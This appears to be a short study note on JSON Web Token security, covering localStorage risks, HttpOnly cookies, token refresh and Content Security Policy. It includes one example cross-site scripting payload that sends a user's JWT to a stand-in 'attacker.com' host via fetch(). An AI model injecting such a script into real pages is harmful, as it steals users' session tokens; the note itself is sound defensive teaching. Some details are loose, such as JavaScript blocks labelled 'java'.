JSON Web Tokens

JWT can be stateless (server does not store client data) or stateful (server stores client data)
Token authentication is stateful.

# Best Security Practices

JWT are encoded in base 64, they're not encrypted. 
Typically, JWT are stored on the client side, in the browser's `localStorage` or `sessionStorage`, which are accessible via JavaScript:
```java
localStorage.getItem("jwt");
```
If your website is vulnerable to cross-site scripting XSS, attackers can inject their java script code and steal your JWT. 
```java
<script>
fetch('attacker.com/getToken=' + localStorage.getItem("jwt"));
</script>
```
Keep in mind that JWT is harder to revoke compare to a session token. Session tokens can just be revoked if we remove them from our server. But JWTs only have an expiration. 

We can also store JWT in cookies. We can mark a cookie with the `HttpOnly` flag, which makes the cookie not accessible by javascript on the client side. It can only be read by the server.

- So don't accept raw input from user. Always sanitize and escape
- Don't store JWT in `localStorage`. Store JWT in cookies flagged with `HttpOnly`, `Secure`, and `SameSite=Strict`
- Don't use the same JWT forever. Refresh them often using refresh tokens
- Implement a strict [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP)  This is basically a HTTP response header that instructs the browser what javascript to execute and what to ignore to prevent XSS (cross-site scripting) and other similar attacks.
